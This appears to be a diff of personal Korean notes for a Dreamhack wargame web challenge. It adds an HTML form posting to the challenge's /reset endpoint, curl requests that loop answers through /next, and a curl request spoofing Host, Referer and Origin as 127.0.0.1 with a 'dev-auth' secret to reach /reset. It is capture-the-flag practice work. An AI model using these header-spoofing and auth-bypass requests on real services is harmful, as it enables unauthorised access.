@@ -2,7 +2,7 @@
 <html lang="ko">
 <head><meta charset="UTF-8"><title>POST Test</title></head>
 <body>
-  <form action="C:\Users\wjddn\Desktop\Dreamhack_Wargame\Web_Hacking\Level_1\328\temp2.html" method="post">
+  <form action="http://host3.dreamhack.games:14670/reset" method="post">
     <input type="text" name="some">
     <button type="submit">POST 전송</button>
   </form>
@@ -13,13 +13,18 @@
 
 
 
+POST 요청을 하나 쏴서 다음 문제로 넘어가기
+
+curl -X POST "http://host3.dreamhack.games:12622/next" 
+
+http://host3.dreamhack.games:12622/next로 POST요청을 body에 questionId은 1부터 722까지, answer = 1 로 해서 반복문을 도는 파이썬 코드를 작성해줘
+
+curl -X POST "http://host3.dreamhack.games:12622/next" -H "Content-Type: application/x-www-form-urlencoded" -d "questionId=1&answer=1"
+
+문제는 722개가 있고 그 문제들은 랜덤하게 표시됨, answer는 사용자가 선택한 1~5사이의 값
 
 
 
 
 
-
-
-
-
-
+curl -X GET "http://host3.dreamhack.games:12622/reset" -H "Host: 127.0.0.1" -H "dev-auth: 1q2w3e4r_solideo!!" -H "Referer: http://127.0.0.1/" -H "Origin: http://127.0.0.1
